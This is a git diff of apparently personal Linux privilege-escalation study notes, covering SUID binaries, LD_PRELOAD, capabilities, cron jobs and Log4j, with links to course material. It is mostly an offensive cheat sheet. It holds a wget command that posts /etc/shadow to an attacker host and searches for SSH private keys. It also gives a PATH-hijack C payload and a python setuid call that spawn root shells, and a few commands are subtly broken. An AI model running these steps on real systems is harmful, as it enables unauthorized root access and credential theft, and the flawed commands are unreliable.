@@ -1,11 +1,12 @@
-**1. Basics**
+**1. Basic CMDs**
 **2. SUIDS, LD_PRELOAD, && CVE's**
-**3. Log4j**
-**4. References**
+**3. Other Escalation Techniques**
+**4. Log4j**
+**5. References**
 
 ---
 
-**1 Basics::**
+###**1 Basic CMDs::**###
 + invoke-rc.d - All access to the init scripts by Debian packages' maintainer scripts should be done through invoke-rc.d
 + ip neigh - like arp -a 
   + check the communication between IP's and ports
@@ -16,13 +17,15 @@
 + ps aux - for ports
 + find / -name authorized_keys 2>/dev/null
 + find / -name id_rsa 2>/dev/null
++ find / -type f -perm -04000 ls 2>/dev/null
++ strace /dir/to/sicky/bit(X.so) 2>&1 | grep -i -E "open|access|no such file"
 
 + intended functionality:
 + sudo apache -f /etc/shadow
 + sudo wget --post-file=/etc/shadow <attacker-ip>:8081 #Send the shadow file to self
 ---
 
-##**2. SUIDS, LD_PRELOAD, && CVE's**##
+###**2. SUIDS, LD_PRELOAD, && CVE's**###
 
 **CVE's && LD_PRELOAD::**
 + Privesc with LD_PRELOAD=
@@ -84,11 +87,45 @@ make
 `find / -type f -perm -04000 -ls 2>/dev/null`
 TODO:: Escalation via shared object injection
 
+##**SUID escalation w/ Binary Symlinks via nginx::**##
+https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
+https://academy.tcm-sec.com/courses/1154399/lectures/24800164
 ---
 
-##**3. Log4j**##
+##**SUID escalation w/ env variables::**##
+https://academy.tcm-sec.com/courses/1154399/lectures/24800170
+```
+strings /usr/local/bin/suid-env :: "etc etc... service apache2 start
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > tmp/service
+gcc /tmp/service.c -o /tmp/service
+export PATH=/tmp:$PATH
+/usr/local/bin/suid-env
+```
+###** 3. Other Escalation techniques::**###
 
-##**CVE-2021-44228 log4j::**##
+
+Enumeration::
+wfuzz -c -f sub-fighter -w /subdomains-top1million-110000.txt -u 'http://cmess.thm' -H "HOST: FUZZ.cmess.thm"
+
+##**Escalation w/ capabilities::**##
+```
+getcap -r / 2>/dev/null :: /usr/bin/python2.6 = cap_setuid+ep #Permit effective || permit everything
+usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash") :: whoami# root'
+tar,openssl,perl,etc,etc
+```
+https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
+https://mn3m.info/posts/suid-vs-capabilities/
+https://int0x33.medium.com/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099
+
+##**Escalation w/ scheduled tasks cron/timers::**##
+```
+cat /etc/crontab
+systemctl list-timers --all
+```
+
+
+###**3. Log4j**###
+**CVE-2021-44228 log4j::**
 TODO:: 
 # [](https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java)
 # [](https://log4shell.huntress.com/)
